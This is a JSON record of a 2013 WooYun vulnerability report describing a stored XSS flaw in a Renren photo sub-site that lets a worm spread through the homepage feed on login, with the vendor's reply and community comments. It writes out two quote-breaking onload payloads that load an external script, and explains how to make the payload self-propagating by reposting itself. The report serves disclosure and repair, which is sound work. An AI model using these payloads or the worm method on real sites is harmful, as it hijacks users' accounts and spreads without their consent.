{"id": 11971, "wybug_id": "wooyun-2013-023391", "wybug_title": "人人网又一大波蠕虫，位置在首页+登录就中招+通杀网页和人人桌面", "wybug_corp": "人人网", "wybug_author": "px1624", "wybug_date": "2013-05-09 20:37", "wybug_open_date": "2013-06-23 20:38", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "蠕虫", "人人网"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-23：\t细节向公众公开  简要描述： 人人网某分站储存xss，导致人人网首页大范围蠕虫。。。位置在首页+登录就中招+通杀网页和人人桌面=20rank。由于是只要登录就会中招，而且通杀人人网页和人人桌面（手机登录没去试不清楚）。所以蠕虫传播速度和范围也是相当的快，危害大大的。。已经习惯人人网的thx了，所以礼物神马的也就不提了，反正提了他们也不会给。。。 详细说明：  1 分站地址：http://photowoo.renren.com/?ngAdID=04P55 2 xss缺陷的原因及位置，上传作品的图片地址没有过滤。\n\n3 抓包修改图片地址参数（此处有过滤><没过滤\"）。\n\n调用外部js的话，用以下两种方式都可以（构造闭合就行了）。\n\" onload=\"jQuery.getScript('js文件地址')\" onload=\"with(document)body.appendChild(createElement('script')).src='js文件地址'\n4 成功后会自动显示加载到人人网首页，别人登录人人网会自动加载到新鲜事中。图片的onload执行，无需交互，登录就中招，并且导致xss蠕虫。。。\n\n   漏洞证明：  1 别人的帐号，随便登录了几个。\n\n \n\n2 可以看到登录进入首页就会加载别人的新鲜事图片，那么就会中招。人人桌面也会被通杀~\n\n这里的图我是插了个纯白的的图片。\n\n3 蠕虫证明、、、这个很简单额，xss的外部js文件中写一个post请求，发一条同样的带有xss的新鲜事就可以了。其他比如发状态之类的，也都可以通过post在js中写入post请求来完成。\n\n一大波蠕虫啊，人人网果然很不安全额。。。   修复方案：  1 由于你们的业务线也蛮长的，http-only你们肯定是不可能回去做了。2 那就过滤下特殊字符吧，反正你们这个是个潜在的，一直存在的问题。就是只要随便一个分站的小小的xss，就可以导致主站甚至是首页的蠕虫攻击。。3 由于这次蠕虫位置在首页，传播无需交互，所以危害比之前的都严重额。这个20rank应该还是有的额，除非用户对于人人网来说，没有任何价值，人人网一点都不关心用于的隐私信息等。。。   版权声明：转载请注明来源 px1624@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-05-09 23:22 厂商回复： 啊 感谢感谢！求地址 送礼物！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-09 20:44 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  你和人人网干上了...    \n     2013-05-09 20:46 |    \t\t煦阳。 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:27        | 这个人很懒，什么都没留下。)\t\t \n  反正提了他们也不会给。。。    \n     2013-05-09 21:35 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @Rookie 。。。友情检测而已。。    \n     2013-05-09 21:36 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @煦阳。 是啊。。。搞不好还会给你甩个1rank  或者直接修补后 忽略。。    \n     2013-05-09 22:10 |    \t\tdiscovery \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | www.google.com)\t\t \n  不给，他们就会倒闭的。^_^    \n     2013-05-09 23:32 |    \t\tBlackeagle \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 向WooYun致敬)\t\t \n  厂商有爱了？    \n     2013-05-10 00:26 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @人人网 @xsser 这次怎么会这么积极主动友好？我有点不适应诶。。。    \n     2013-05-10 01:19 |    \t\t0ps \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:10        | xo)\t\t \n  厂商好可爱.....目测是妹纸    \n     2013-05-10 01:40 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:7        )\t\t \n  估计是看到最后一句了。。以后大家发漏洞。也写个    \n     2013-05-10 08:24 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  @px1624 有可能要了地址过去..就是不发货.    \n     2013-05-10 08:36 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  马克    \n     2013-05-10 08:42 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @Rookie 应该不会吧，搜狐反正是这样的    \n     2013-05-10 11:07 |    \t\t牛博恩 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:3        | Oh god my savior)\t\t \n  邮寄个妹子当礼物吧    \n     2013-05-11 14:08 |    \t\tdiscovery \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | www.google.com)\t\t \n  啊 啊啊啊啊啊啊啊啊啊 啊啊 啊啊啊啊啊 感谢感谢！求地址 送礼物！    \n     2013-05-30 11:00 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:111        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @px1624 给了地址？拿到了礼物？    \n     2013-06-09 10:20 |    \t\t风之传说 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:28        | 借用朋友的一句话，你的时间在哪里，你的成...)\t\t \n  这个不错不错，来顶一个。。顺便来看看妹子。    \n     2013-10-22 00:43 |    \t\tHonker红颜 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:50        | 皖南人士,90后宅男,自学成才,天朝教育失败....)\t\t \n  @px1624 人人网送什么礼物哈，不会送俩美女或者俩充气娃娃吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}